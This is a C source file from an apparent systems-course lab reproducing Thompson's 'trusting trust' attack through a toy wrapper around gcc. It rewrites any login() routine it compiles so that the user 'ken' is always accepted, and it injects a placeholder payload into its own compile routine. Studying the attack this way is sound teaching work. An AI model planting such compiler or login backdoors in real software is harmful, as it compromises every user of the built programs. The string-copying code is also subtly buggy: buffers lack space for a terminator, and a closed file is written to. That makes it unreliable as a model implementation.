// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>


#define error(args...) do { fprintf(stderr, ##args); exit(1);  } while(0)

// a not very interesting compile: throw the input into a 
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
    FILE *fp = fopen("./temp-out.c", "w");
    assert(fp);


    /*****************************************************************
     * Step 1:
     */
 
    // match on the start of the login() routine:
    static char login_sig[] = "int login(char *user) {";

    // and inject an attack for "ken":
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

	char *login = strstr(program, login_sig); // found where login sig starts, if it does
    if (login != NULL) {
		//initalize new program string to hold original program plus our attack
		char *new_program = malloc(sizeof(char) * (strlen(program) + strlen(login_attack)));
		assert (new_program != NULL);
		char *inject = login + strlen(login_sig); //ptr to where we want the injection to go in function
		//copy up to the login signature into new program
		strncpy(new_program, program, login - program);
		//copy in the login signature itself
		strncat(new_program, login_sig, strlen(login_sig));
		//copy attack in
		strncat(new_program, login_attack, strlen(login_attack));
		//copy in rest of the program unchanged
		strcat(new_program, login + strlen(login_sig));

		fprintf(fp, "%s", new_program);
		fclose(fp);
		free(new_program);
	}


	
    /*****************************************************************
     * Step 2:
     */

    // search for the start of the compile routine: 
    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;

    // and inject a placeholder "attack":
    // inject this after the assert above after the call to fopen.
    // not much of an attack.   this is just a quick placeholder.
    static char compile_attack[] 
              = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";



	char *compile = strstr(program, compile_sig); // found where login sig starts, if it does
    if (compile != NULL) {
		//initalize new program string to hold original program plus our attack
		char *new_program = malloc(sizeof(char) * (strlen(program) + strlen(compile_attack)));
		assert (new_program != NULL);
		char *inject = compile + strlen(compile_sig); //ptr to where we want the injection to go in function
		//copy up to the login signature into new program
		strncpy(new_program, program, compile - program);
		//copy in the login signature itself
		strncat(new_program, compile_sig, strlen(compile_sig));
		//copy attack in
		strncat(new_program, compile_attack, strlen(compile_attack));
		//copy in rest of the program unchanged
		strcat(new_program, compile + strlen(compile_sig));

		fprintf(fp, "%s", new_program);
    	fclose(fp);
		free(new_program);
	} else{
		//not compiler program
		fprintf(fp, "%s", program);
    	fclose(fp);
	}

    /************************************************************
     * don't modify the rest.
     */

    // gross, call gcc.
    char buf[1024];
    sprintf(buf, "gcc ./temp-out.c -o %s", outname);
    if(system(buf) != 0)
        error("system failed\n");
}



#   define N  8 * 1024 * 1024
static char buf[N+1];

int main(int argc, char *argv[]) {
    if(argc != 4)
        error("expected 4 arguments have %d\n", argc);
    if(strcmp(argv[2], "-o") != 0)
        error("expected -o as second argument, have <%s>\n", argv[2]);

    // read in the entire file.
    int fd;
    if((fd = open(argv[1], O_RDONLY)) < 0)
        error("file <%s> does not exist\n", argv[1]);

    int n;
    if((n = read(fd, buf, N)) < 1)
        error("invalid read of file <%s>\n", argv[1]);
    if(n == N)
        error("input file too large\n");

    // "compile" it.
    compile(buf, argv[3]);
    return 0;
}
